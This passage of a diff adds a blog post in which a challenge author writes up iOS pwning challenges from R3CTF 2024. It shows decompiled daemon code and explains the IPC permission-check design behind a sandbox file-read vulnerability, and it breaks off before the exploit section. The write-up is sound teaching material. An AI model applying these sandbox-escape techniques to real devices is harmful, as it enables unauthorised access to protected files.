@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="I authored two iOS pwning challenges in R3CTF 2024 a few weeks ago. This post is a write-up for the challenges. pwn0win - Forbidden Content This challenge requires you to read a file that is outside o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn0win: iOS pwning challenges in R3CTF">
+<meta property="og:url" content="https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="I authored two iOS pwning challenges in R3CTF 2024 a few weeks ago. This post is a write-up for the challenges. pwn0win - Forbidden Content This challenge requires you to read a file that is outside o">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-07-04T17:46:23.000Z">
+<meta property="article:modified_time" content="2024-07-04T19:05:03.065Z">
+<meta property="article:author" content="Xia0o0o0o">
+<meta property="article:tag" content="iOS">
+<meta property="article:tag" content="XNU">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
+        
+      
+    
+    <!-- title -->
+    <title>Pwn0win: iOS pwning challenges in R3CTF</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="../../../../css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="atom.xml" title="" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+      <!--
+           -->
+        <li>
+          <span style="display: flex; align-items: center;">
+            <title>
+              Home
+            </title>
+            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>
+              <a style="padding-left: 9px;" href="../../../../index.html">
+                Home
+              </a>
+          </span>
+        </li>
+        <!--
+           -->
+        <li>
+          <span style="display: flex; align-items: center;">
+            <title>
+              Writing
+            </title>
+            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>
+              <a style="padding-left: 9px;" href="../../../../archives/">
+                Writing
+              </a>
+          </span>
+        </li>
+        <!--
+           -->
+        <li>
+          <span style="display: flex; align-items: center;">
+            <title>
+              Projects
+            </title>
+            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>
+              <a style="padding-left: 9px;" href="../../../../https:/github.com/KpwnZ">
+                Projects
+              </a>
+          </span>
+        </li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="../../../03/09/Boot-Newer-iOS-with-QEMU-Step-by-Step/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&text=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&is_video=false&description=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwn0win: iOS pwning challenges in R3CTF&body=Check out this article: https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&title=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&name=Pwn0win: iOS pwning challenges in R3CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2024/07/04/Pwn0win-iOS-pwning-challenges-in-R3CTF/&t=Pwn0win: iOS pwning challenges in R3CTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn0win-Forbidden-Content"><span class="toc-number">1.</span> <span class="toc-text">pwn0win - Forbidden Content</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Pwn0win: iOS pwning challenges in R3CTF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Xia0o0o0o</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-04T17:46:23.000Z" class="dt-published" itemprop="datePublished">2024-07-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag" style="text-decoration: none;">
+        <i class="fa-solid fa-tag"></i>
+        <a class="tag-category" href="../../../../tags/PWN/" rel="tag">PWN</a> <a class="tag-category" href="../../../../tags/XNU/" rel="tag">XNU</a> <a class="tag-category" href="../../../../tags/iOS/" rel="tag">iOS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>I authored two iOS pwning challenges in R3CTF 2024 a few weeks ago. This post is a write-up for the challenges.</p>
+<h2 id="pwn0win-Forbidden-Content">pwn0win - Forbidden Content</h2>
+<p>This challenge requires you to read a file that is outside of application’s sandbox and not accessible by <code>mobile</code> user. The challenge was running on an iPhone 8 with iOS 16.7.1.</p>
+<p>Players are given two executable files <code>fileviewerd</code> and <code>securityd</code>. And some <code>.defs</code> files related to the IPC interfaces of these two processes. The <code>fileviewerd</code> is a daemon that provides file viewing service to other applications. The <code>securityd</code> is a daemon that provides security verification service to <code>fileviewerd</code>.</p>
+<p>In <code>fileviewerd</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uintptr_t</span> handle; <span class="comment">// ST10_8</span></span><br><span class="line">  __int64 v4; <span class="comment">// x0</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dispatch_queue_s</span> *<span class="title">v5</span>;</span> <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">dispatch_source_t</span> v6; <span class="comment">// ST28_8</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// [xsp+30h] [xbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [xsp+38h] [xbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [xsp+3Ch] [xbp-44h]</span></span><br><span class="line">  __int64 (__fastcall *v11)(); <span class="comment">// [xsp+40h] [xbp-40h]</span></span><br><span class="line">  <span class="keyword">void</span> *v12; <span class="comment">// [xsp+48h] [xbp-38h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [xsp+50h] [xbp-30h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [xsp+58h] [xbp-28h]</span></span><br><span class="line">  <span class="keyword">dispatch_source_t</span> v15; <span class="comment">// [xsp+60h] [xbp-20h]</span></span><br><span class="line">  <span class="keyword">dispatch_queue_t</span> v16; <span class="comment">// [xsp+68h] [xbp-18h]</span></span><br><span class="line">  <span class="keyword">kern_return_t</span> v17; <span class="comment">// [xsp+74h] [xbp-Ch]</span></span><br><span class="line">  <span class="keyword">mach_port_t</span> sp; <span class="comment">// [xsp+78h] [xbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [xsp+7Ch] [xbp-4h]</span></span><br><span class="line">  <span class="keyword">dispatch_object_t</span> v20; <span class="comment">// 0:x0.8</span></span><br><span class="line"></span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v17 = bootstrap_check_in(*(_DWORD *)bootstrap_port_ptr, <span class="string">&quot;com.xia0o0o0o.fileviewerd&quot;</span>, &amp;sp);</span><br><span class="line">  <span class="keyword">if</span> ( v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    NSLog(&amp;stru_1000084C8);</span><br><span class="line">    v19 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    NSLog(&amp;stru_1000084E8);</span><br><span class="line">    v17 = bootstrap_look_up(*(_DWORD *)bootstrap_port_ptr, <span class="string">&quot;com.xia0o0o0o.securityd&quot;</span>, (<span class="keyword">mach_port_t</span> *)&amp;securityd_port);</span><br><span class="line">    <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      NSLog(&amp;stru_100008528);</span><br><span class="line">      v16 = dispatch_queue_create(<span class="string">&quot;queue&quot;</span>, (<span class="keyword">dispatch_queue_attr_t</span>)_dispatch_queue_attr_concurrent_ptr);</span><br><span class="line">      handle = sp;</span><br><span class="line">      v4 = objc_retainAutoreleaseReturnValue(_dispatch_main_q_ptr);</span><br><span class="line">      v5 = (struct dispatch_queue_s *)objc_retainAutoreleasedReturnValue(v4);</span><br><span class="line">      v15 = dispatch_source_create((<span class="keyword">dispatch_source_type_t</span>)_dispatch_source_type_mach_recv_ptr, handle, <span class="number">0LL</span>, v5);</span><br><span class="line">      objc_release(v5);</span><br><span class="line">      v6 = v15;</span><br><span class="line">      v8 = _NSConcreteStackBlock_ptr;</span><br><span class="line">      v9 = <span class="number">-1040187392</span>;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">      v11 = __main_block_invoke;</span><br><span class="line">      v12 = &amp;__block_descriptor_48_e8_32s40s_e5_v8__0l;</span><br><span class="line">      v13 = objc_retain(v16);</span><br><span class="line">      v14 = objc_retain(v15);</span><br><span class="line">      dispatch_source_set_event_handler(v6, &amp;v8);</span><br><span class="line">      v20._do = v15;</span><br><span class="line">      dispatch_resume(v20);</span><br><span class="line">      dispatch_main();</span><br><span class="line">    &#125;</span><br><span class="line">    NSLog(&amp;stru_100008508);</span><br><span class="line">    v19 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v19;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>It will register a service with <code>com.xia0o0o0o.fileviewerd</code> and look up service with <code>com.xia0o0o0o.securityd</code>.</p>
+<p>We can see the event source is basically</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dispatch_source_t</span> source = dispatch_source_create(</span><br><span class="line">    DISPATCH_SOURCE_TYPE_MACH_RECV, port, <span class="number">0</span>, dispatch_get_main_queue());</span><br></pre></td></tr></table></figure>
+<p>and the event handler is wrapped in a <code>dispatch_async</code> block.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall __main_block_invoke(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [xsp+18h] [xbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [xsp+20h] [xbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [xsp+24h] [xbp-2Ch]</span></span><br><span class="line">  __int64 (__fastcall *v6)(); <span class="comment">// [xsp+28h] [xbp-28h]</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [xsp+30h] [xbp-20h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [xsp+38h] [xbp-18h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [xsp+40h] [xbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [xsp+48h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = a1;</span><br><span class="line">  v9 = a1;</span><br><span class="line">  v1 = *(_QWORD *)(a1 + <span class="number">32</span>);</span><br><span class="line">  v3 = _NSConcreteStackBlock_ptr;</span><br><span class="line">  v4 = <span class="number">-1040187392</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = __main_block_invoke_2;</span><br><span class="line">  v7 = &amp;__block_descriptor_40_e8_32s_e5_v8__0l;</span><br><span class="line">  v8 = objc_retain(*(_QWORD *)(a1 + <span class="number">40</span>));</span><br><span class="line">  dispatch_async(v1, &amp;v3);</span><br><span class="line">  <span class="keyword">return</span> objc_storeStrong(&amp;v8, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>fileviewerd</code> can register a callback port</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">SERVER_register_callback</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [xsp+28h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( global_callback_port )</span><br><span class="line">  &#123;</span><br><span class="line">    mach_port_deallocate(*(_DWORD *)mach_task_self__ptr, global_callback_port);</span><br><span class="line">    NSLog(&amp;stru_100008288);</span><br><span class="line">    NSLog(&amp;stru_1000082A8);</span><br><span class="line">  &#125;</span><br><span class="line">  NSLog(&amp;stru_1000082A8);</span><br><span class="line">  NSLog(&amp;stru_1000082C8);</span><br><span class="line">  NSLog(&amp;stru_1000082E8);</span><br><span class="line">  global_callback_port = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>and when calling <code>read_file()</code> or <code>move_file()</code> it will first verify the user of the request and the actual file owner by communicating with <code>securityd</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">SERVER_read_file</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, __int128 *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int128 *v3; <span class="comment">// ST40_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// vf</span></span><br><span class="line">  FILE *v6; <span class="comment">// [xsp+58h] [xbp-488h]</span></span><br><span class="line">  __int128 v7; <span class="comment">// [xsp+60h] [xbp-480h]</span></span><br><span class="line">  __int128 v8; <span class="comment">// [xsp+70h] [xbp-470h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [xsp+8Ch] [xbp-454h]</span></span><br><span class="line">  __int128 v10; <span class="comment">// [xsp+90h] [xbp-450h]</span></span><br><span class="line">  __int128 v11; <span class="comment">// [xsp+A0h] [xbp-440h]</span></span><br><span class="line">  <span class="keyword">mach_error_t</span> error_value; <span class="comment">// [xsp+B4h] [xbp-42Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v13; <span class="comment">// [xsp+B8h] [xbp-428h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [xsp+C0h] [xbp-420h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// [xsp+C4h] [xbp-41Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [xsp+C8h] [xbp-418h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [xsp+4C8h] [xbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v17 = *(_QWORD *)__stack_chk_guard_ptr;</span><br><span class="line">  v14 = a1;</span><br><span class="line">  v13 = a2;</span><br><span class="line">  error_value = <span class="number">0</span>;</span><br><span class="line">  v10 = *a3;</span><br><span class="line">  v11 = a3[<span class="number">1</span>];</span><br><span class="line">  audit_token_to_pid(&amp;v10);</span><br><span class="line">  NSLog(&amp;stru_100008328);</span><br><span class="line">  v7 = *v3;</span><br><span class="line">  v8 = v3[<span class="number">1</span>];</span><br><span class="line">  v9 = audit_token_to_euid(&amp;v7);</span><br><span class="line">  NSLog(&amp;stru_100008348);</span><br><span class="line">  error_value = CLIENT_check_perm((<span class="keyword">unsigned</span> <span class="keyword">int</span>)securityd_port, v9, v13);   <span class="comment">// check permission, </span></span><br><span class="line">                                                                            <span class="comment">// send mach msg to </span></span><br><span class="line">                                                                            <span class="comment">// securityd</span></span><br><span class="line">  <span class="keyword">if</span> ( error_value )</span><br><span class="line">  &#123;</span><br><span class="line">    NSLog(&amp;stru_100008368);</span><br><span class="line">    __strcpy_chk(&amp;v16, <span class="string">&quot;Permission denied\n&quot;</span>, <span class="number">1024LL</span>);</span><br><span class="line">    v15 = error_value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = fopen(v13, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      bzero(&amp;v16, <span class="number">0x400</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( fread(&amp;v16, <span class="number">1uLL</span>, <span class="number">0x400</span>uLL, v6) )</span><br><span class="line">      &#123;</span><br><span class="line">        fclose(v6);</span><br><span class="line">        NSLog(&amp;stru_1000083C8);</span><br><span class="line">        <span class="keyword">if</span> ( global_callback_port</span><br><span class="line">          &amp;&amp; (NSLog(&amp;stru_1000083E8),</span><br><span class="line">              (error_value = fileviewer_listener_callback((<span class="keyword">unsigned</span> <span class="keyword">int</span>)global_callback_port, &amp;v16)) != <span class="number">0</span>) )    <span class="comment">// send mach msg to callback port</span></span><br><span class="line">        &#123;</span><br><span class="line">          NSLog(&amp;stru_100008408);</span><br><span 